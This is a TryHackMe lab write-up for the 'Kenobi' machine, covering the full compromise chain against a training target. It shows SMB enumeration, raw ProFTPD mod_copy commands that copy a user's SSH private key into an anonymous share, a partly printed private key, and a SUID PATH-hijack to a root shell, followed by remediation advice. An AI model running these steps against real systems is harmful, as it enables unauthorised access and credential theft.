# Kenobi — TryHackMe Writeup

**Platform:** TryHackMe | **Difficulty:** Easy | **Target IP:** 10.66.134.91 | **Attacker IP:** 192.168.131.193

## Machine info

![Kenobi machine card](images/01-machine-info.png)

## Summary

**Kenobi** is an easy TryHackMe room built around a configuration leak reachable through an anonymous Samba share. An anonymous SMB session exposes `log.txt`, a stray log file holding the server's own SSH key-generation output for `kenobi` — revealing the private key's path, `/home/kenobi/.ssh/id_rsa` — together with the box's full `proftpd.conf` and `smb.conf`, confirming that ProFTPD runs as the `kenobi` user and that the anonymous share maps to `/home/kenobi/share`. ProFTPD 1.3.5's unauthenticated `mod_copy` module (`SITE CPFR`/`SITE CPTO`) is then used to copy the private key server-side; copying it into the webroot is denied, but copying it into the anonymous share succeeds, since that path is owned by the same user the FTP service runs as. The key is pulled back over SMB and used to SSH in as `kenobi`. A non-standard SUID binary, `/usr/bin/menu`, calls `ifconfig` without an absolute path, allowing a `PATH` hijack that escalates straight to root.

**Attack chain:** Anonymous SMB Share → Leaked log.txt (id_rsa path + ProFTPD/Samba config) → ProFTPD 1.3.5 mod_copy (unauthenticated SITE CPFR/CPTO) → Key Copied to Anonymous Share → SMB Download → SSH as kenobi → SUID /usr/bin/menu PATH Hijack (ifconfig) → Root

## 1. Reconnaissance

A full TCP port scan found FTP (ProFTPD 1.3.5), SSH, Apache with `/admin.html` disallowed in `robots.txt`, RPC/NFS services, and Samba running as `KENOBI`:

```
nmap -p- -sS -sV -sC -vvv -oN scan.txt 10.66.134.91
...
Nmap scan report for 10.66.134.91
Host is up, received echo-reply ttl 62 (0.051s latency).
Scanned at 2026-10-26 06:27:07 EDT for 32s
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 62 ProFTPD 1.3.5
22/tcp    open  ssh         syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 61:1c:10:3b:47:8e:66:73:f9:1e:b8:10:e0:dc:cf:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGuOwffOQWMBj9TrIWfwr5VIZmVlQrhkRqZq8BBUrI0yaUKdNR7AUJyGZFvDPIqEKIVgX6ZZZqekwLJ1fQcVB+VBSu6WEt4Hn4SNVidzXfa9klTnv51cSePU9N51AB488G4wECs5H0WlYoLy8aOKd7Mv0d29ZullrTUTPKxUrOrQfeNS7D02tx0n17pqTeHKfhkEO+JmV4+fC1dz5p3NqEq921E3/RkyGk70AQ8O+SdBwwPaCCnFsufN9MnkDlwke9rUJcsEpASrf515fEuybXD7A4oJ/3uR2KtsNJDRMsGeTMOy2qy1Zmew8eBl1vWMHvESo9iIMkK7CiYd55rF1WarGlnp4S2qf6Kgy5NfWtqBBT86bRFA4am7+3+GWuh9jWRyCv8hFVR9Slq0LTuv93uGzJ4zXOXetwSKHJdIE9WhpENycOL5VmUPKhKF3FLTeGYcm0jULKM+0/+ZkdpjoLeZr8s9Lt5BvThTF0JbP3D+tTVqV6HVtrO9Ec5H8T1bM=
|   256 35:26:35:67:41:8d:0b:80:e9:30:97:64:6d:aa:05:57 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEiuLAH4P1ZUaFi4bngGoOjKYFfah85gUipf74NzP0FcEjRWZY36EQnOwEAjQ6JvzFGXT71tp5S5P5umBBgU4JM=
|   256 ed:f0:7a:c2:7a:b6:91:3b:61:a5:2e:b9:b7:cc:e0:ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnhy1mm2lNjR1zbWi3armszDX6S1xpFwEVhLQA+wkrE
80/tcp    open  http        syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind     syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37671/tcp6  mountd
|   100005  1,2,3      42907/tcp   mountd
|   100005  1,2,3      49355/udp   mountd
|   100005  1,2,3      59464/udp6  mountd
|   100021  1,3,4      33391/tcp6  nlockmgr
|   100021  1,3,4      34953/udp   nlockmgr
|   100021  1,3,4      42683/tcp   nlockmgr
|   100021  1,3,4      54666/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack ttl 62 Samba smbd 4
445/tcp   open  netbios-ssn syn-ack ttl 62 Samba smbd 4
2049/tcp  open  nfs         syn-ack ttl 62 3-4 (RPC #100003)
36591/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
42683/tcp open  nlockmgr    syn-ack ttl 62 1-4 (RPC #100021)
42907/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
46977/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61740/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35143/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 6232/udp): CLEAN (Failed to receive data)
|   Check 4 (port 18909/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-10-26T10:27:35
|_  start_date: N/A
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

## 2. SMB Enumeration — Anonymous Share & Leaked Configuration

`enum4linux` confirmed a valid null session and a mappable `anonymous` share:

```
enum4linux 10.66.134.91
...
 =================================( Share Enumeration on 10.66.134.91 )=================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))

...
[+] Attempting to map shares on 10.66.134.91
//10.66.134.91/print$   Mapping: DENIED Listing: N/A Writing: N/A
//10.66.134.91/anonymous        Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.66.134.91/IPC$     Mapping: N/A Listing: N/A Writing: N/A
```

RID cycling also enumerated the local Unix users `kenobi` and `ubuntu`:

```
...
 ==================( Users on 10.66.134.91 via RID cycling (RIDS: 500-550,1000-1050) )==================

...
S-1-22-1-1000 Unix User\kenobi (Local User)
S-1-22-1-1001 Unix User\ubuntu (Local User)
```

Connecting to the anonymous share turned up a single file, `log.txt`:

```
smbclient //10.66.134.91/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Sat Aug  9 09:03:22 2025
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9183416 blocks of size 1024. 3004188 blocks available
smb: \> get log.txt 
getting file \log.txt of size 12237 as log.txt (53.1 KiloBytes/sec) (average 53.1 KiloBytes/sec)
```

`log.txt` turned out to be the server's own SSH keygen log followed by its full `proftpd.conf` and `smb.conf`, leaking the private key's path, the FTP service user, and the anonymous share's real path:

```
cat log.txt
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
...
User                            kenobi
Group                           kenobi
...
[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes
```

`searchsploit` confirmed this ProFTPD version is vulnerable to `mod_copy`:

```
searchsploit ProFTPD 1.3.5
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)    | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution          | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)      | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt
```

## 3. ProFTPD mod_copy — Unauthenticated Remote File Copy

`mod_copy` is exploited manually with raw `SITE CPFR`/`SITE CPTO` commands over a direct connection to port 21 — no authentication is required. Copying the key into the webroot is denied, since `kenobi` has no write access there:

```
nc 10.66.134.91 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.66.134.91]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/id_rsa
550 CPTO: Permission denied
```

`log.txt` had already shown that the anonymous share (`/home/kenobi/share`) belongs to `kenobi` at the filesystem level — Samba's `read only` setting restricts SMB clients only, not the owning process itself — so the key is copied there instead:

```
nc 10.66.134.91 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.66.134.91]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /home/kenobi/share/id_rsa
250 Copy successful
```

The key is pulled back over the same anonymous SMB share:

```
smbclient //10.66.134.91/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 26 06:51:16 2026
  ..                                  D        0  Sat Aug  9 09:03:22 2025
  id_rsa                              N     1675  Mon Oct 26 06:51:16 2026
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9183416 blocks of size 1024. 3004168 blocks available
smb: \> get id_rsa 
getting file \id_rsa of size 1675 as id_rsa (7.9 KiloBytes/sec) (average 7.9 KiloBytes/sec)
```

```
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
...
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----
```

```
chmod 600 id_rsa
```

The recovered key logs in directly as `kenobi`:

![SSH login as kenobi](images/02-ssh-login.png)

![user flag](images/03-user-flag.png)

## 4. Privilege Escalation — PATH Hijacking via SUID menu

SUID binaries on the box include one that isn't a standard Ubuntu utility, `/usr/bin/menu`:

```
find / -perm -4000 2>/dev/null
...
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
```

`strings` on the binary shows a menu that calls system commands without an absolute path:

```
strings menu
...
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
...
```

Option 3 calls `ifconfig` unqualified, so prepending a fake one to `PATH` and running the menu executes it with the SUID binary's root privileges:

```
cd /tmp
echo '/bin/bash' > ifconfig
chmod +x ifconfig
export PATH=/tmp:$PATH
/usr/bin/menu
```

Choosing option 3 drops a root shell:

![Root shell via PATH hijacking in /usr/bin/menu](images/04-root-shell.png)

![root flag](images/05-root-flag.png)

## Root Cause & Remediation

| Issue | Fix |
|---|---|
| An anonymous SMB session exposes `log.txt`, leaking the SSH keygen log and the full ProFTPD/Samba configuration | Disable anonymous/guest SMB access; never leave configuration logs or keygen output in a world-readable share |
| ProFTPD 1.3.5's `mod_copy` module allows unauthenticated arbitrary file copy via `SITE CPFR`/`SITE CPTO` | Upgrade ProFTPD or disable `mod_copy`; restrict FTP to authenticated users |
| The anonymous Samba share shares a filesystem owner with the FTP service account, letting it be used to stage exfiltrated files | Keep exported Samba paths out of service accounts' home directories; enforce least privilege |
| SUID binary `/usr/bin/menu` calls `curl`, `uname`, and `ifconfig` without absolute paths | Always use absolute paths in `system()` calls inside SUID binaries; avoid the SUID bit where it isn't strictly required |
